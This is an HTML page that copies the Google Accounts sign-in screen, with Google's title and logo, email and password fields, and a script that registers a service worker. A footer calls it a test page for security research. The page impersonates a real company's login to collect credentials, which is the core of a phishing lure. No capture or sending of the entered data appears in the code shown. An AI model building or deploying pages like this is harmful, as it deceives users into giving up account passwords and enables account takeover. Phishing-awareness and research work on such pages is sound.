<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Sign in â€“ Google Accounts</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="manifest" href="./manifest.json">
  <meta name="theme-color" content="#ffffff">

  <style>
    body {
      font-family: Arial, Helvetica, sans-serif;
      background: #f1f3f4;
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .card {
      background: #fff;
      width: 360px;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,.1);
      text-align: center;
    }

    .logo {
      width: 152px;
      margin-bottom: 16px;
    }

    h1 {
      font-size: 22px;
      font-weight: 400;
      margin: 8px 0;
    }

    p {
      color: #5f6368;
      font-size: 14px;
      margin-bottom: 24px;
    }

    input {
      width: 100%;
      padding: 14px;
      font-size: 15px;
      margin-bottom: 16px;
      border-radius: 4px;
      border: 1px solid #dadce0;
    }

    button {
      width: 100%;
      background: #1a73e8;
      color: white;
      border: none;
      padding: 12px;
      font-size: 14px;
      border-radius: 4px;
      cursor: pointer;
    }

    button:hover {
      background: #1558b0;
    }

    .footer {
      margin-top: 20px;
      font-size: 12px;
      color: #5f6368;
    }
  </style>
</head>

<body>
  <div class="card">
    <img src="./google.png" class="logo" alt="Google">
    <h1>Sign in</h1>
    <p>Use your Google Account</p>

    <input type="email" placeholder="Email or phone">
    <input type="password" placeholder="Enter your password">

    <button>Next</button>

    <div class="footer">
      This is a test page for security research
    </div>
  </div>

<script>
  if ('serviceWorker' in navigator) {
    window.addEventListener('load', () => {
      navigator.serviceWorker.register('./sw.js', { scope: './' })
        .then(reg => console.log('[OK] SW scope:', reg.scope))
        .catch(err => console.error('[ERR] SW failed:', err));
    });
  }
</script>

</body>
</html>
